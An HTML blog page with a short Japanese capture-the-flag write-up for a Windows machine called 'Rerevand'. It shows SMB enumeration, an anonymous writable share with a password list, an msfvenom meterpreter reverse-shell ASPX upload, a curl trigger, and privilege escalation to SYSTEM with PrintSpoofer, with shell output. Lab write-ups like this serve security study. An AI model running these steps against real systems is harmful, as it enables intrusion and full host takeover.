@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Rerevand // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="../../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Rerevand"/>
+<meta name="twitter:description" content="user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &gt; shell C:\users\bob\desktop&gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&gt;dir dir Volume in drive C has no label."/>
+
+    <meta property="og:title" content="Rerevand" />
+<meta property="og:description" content="user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &gt; shell C:\users\bob\desktop&gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&gt;dir dir Volume in drive C has no label." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/rerevand/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2024-03-18T09:58:44+09:00" />
+<meta property="article:modified_time" content="2024-03-18T09:58:44+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="../../images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <p><font size="1">内容の正確性は保証していません🐶</font></p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="../../">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../log">log</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../treasure/">treasure trove</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="../../sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../interpreter">interpreter</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Rerevand</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 18, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+      </div>
+      <hr>
+    </header>
+    <div class="post-content">
+      <h3 id="user">user</h3>
+<ul>
+<li>smb が開いてるのでこれを起点にする
+<ul>
+<li>enum4linux は動かなかった</li>
+<li>nmap よく見たら windows だった</li>
+<li><code>smbclient -L \\\\ip</code> で使えそうな share を探す</li>
+<li><code>nt4wrksv</code> が使えそう</li>
+<li>パスワードなしで入れる</li>
+<li>パスワードリストが手に入る</li>
+</ul>
+</li>
+<li><code>nt4wrksv</code> が書き込み可能なのでリバースシェルを入れる(<a href="https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/#upload-files">SMB (Server Message Block) Pentesting - Exploit Notes</a>)
+<ul>
+<li><code>msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp</code></li>
+<li><code>smb: \&gt; put shell.aspx</code></li>
+<li><code>curl http://10.10.16.163:49663/nt4wrksv/shell.aspx</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="root">root</h3>
+<ul>
+<li>SeImpersonatePrivilege が使える(<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">Abusing Tokens - HackTricks</a>)</li>
+<li><code>wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</code> を使う</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>eterpreter &gt; getprivs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enabled Process Privileges
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Name
+</span></span><span style="display:flex;"><span>----
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege
+</span></span><span style="display:flex;"><span>SeAuditPrivilege
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\b</span>ob<span style="color:#ae81ff">\d</span>esktop&gt;cd c:/inetpub/wwwroot/nt4wrksv
+</span></span><span style="display:flex;"><span>cd c:/inetpub/wwwroot/nt4wrksv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot<span style="color:#ae81ff">\n</span>t4wrksv&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AC3C-5CB5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot<span style="color:#ae81ff">\n</span>t4wrksv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/17/2024  05:50 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/17/2024  05:50 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>07/25/2020  08:15 AM                <span style="color:#ae81ff">98</span> passwords.txt
+</span></span><span style="display:flex;"><span>03/17/2024  05:50 PM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>03/17/2024  05:45 PM         1,020,190 shell.aspx
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>      1,047,424 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  20,277,039,104 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot<span style="color:#ae81ff">\n</span>t4wrksv&gt;PrintSpoofer64.exe -i -c powershell.exe
+</span></span><span style="display:flex;"><span>PrintSpoofer64.exe -i -c powershell.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Named pipe listening...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CreateProcessAsUser<span style="color:#f92672">()</span> OK
+</span></span><span style="display:flex;"><span>Windows PowerShell 
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; cd /users/administrator/desktop
+</span></span><span style="display:flex;"><span>cd /users/administrator/desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\a</span>dministrator<span style="color:#ae81ff">\d</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\a</span>dministrator<span style="color:#ae81ff">\d</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                          
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                          
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:25 AM             <span style="color:#ae81ff">35</span> root.txt  
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
